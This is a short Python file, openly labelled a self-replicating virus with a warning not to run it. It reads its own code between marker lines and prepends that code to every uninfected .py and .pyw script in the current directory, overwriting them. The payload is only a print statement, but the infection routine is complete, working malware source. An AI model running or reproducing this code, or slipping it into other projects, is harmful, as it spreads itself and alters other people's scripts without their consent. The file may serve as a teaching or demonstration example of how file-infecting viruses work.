# WARNING: This is a self-replicating virus, do not run!

### START OF VIRUS ###
import sys, glob

code = []
with open(sys.argv[0], 'r') as f:  # Get the name of the file and open it in read mode
    lines = f.readlines()

virus_area = False  # Only the code in the area should be injected in other scripts
for line in lines:
    if line == '### START OF VIRUS ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### END OF VIRUS ###\n':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw') # Finds all scripts ending in .py or .pyw
# print(python_scripts)

for script in python_scripts: # Open and read all the found scripts
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### START OF VIRUS ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

# Malicious code (Payload):
print("Virus injected")

### END OF VIRUS ###
